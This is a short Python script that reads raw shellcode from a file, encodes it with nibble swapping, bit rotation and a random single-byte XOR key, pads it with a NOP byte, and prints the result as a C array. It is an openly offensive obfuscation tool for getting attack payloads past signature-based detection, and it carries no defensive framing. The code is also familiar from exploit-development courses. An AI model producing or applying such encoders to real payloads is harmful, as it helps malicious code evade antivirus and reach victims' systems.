# read shellcode from `shellcode.bin` and
# generate the encoded shellcode 

import random 

# make sure n is 0 < n < 8
def rotl(x,n):
    return ((x << n) & 0xFF) | (x >> (8 - n))

def rotr(x,n):
    return (x >> n) | ((x << (8 - n)) & 0xFF)


with open("shellcode.bin", "rb") as f:
    shcode = f.read()
shlen = len(shcode)

# generate single byte key
key = random.randrange(1,255)

# make sure shellcode is even-length
if shlen % 2 == 1:
    shcode += b"\x90"
    shlen  += 1

# encode shellcode
enc_shcode = [key]
idx = 0
while idx < shlen:
    tl = shcode[idx    ]     # LEFT
    tr = shcode[idx + 1]     # RIGHT

    # get half of each byte and cross
    l = (tl & 0xF0) | (tr & 0x0F)
    r = (tl & 0x0F) | (tr & 0xF0)

    # rorate then XOR
    enc_shcode.append(rotl(l, 3) ^ key)
    enc_shcode.append(rotr(r, 3) ^ key)

    idx += 2

# print as C-array
print("{ ", end='')
print(",".join("0x{:02x}".format(c) for c in enc_shcode), end='')
print(" }")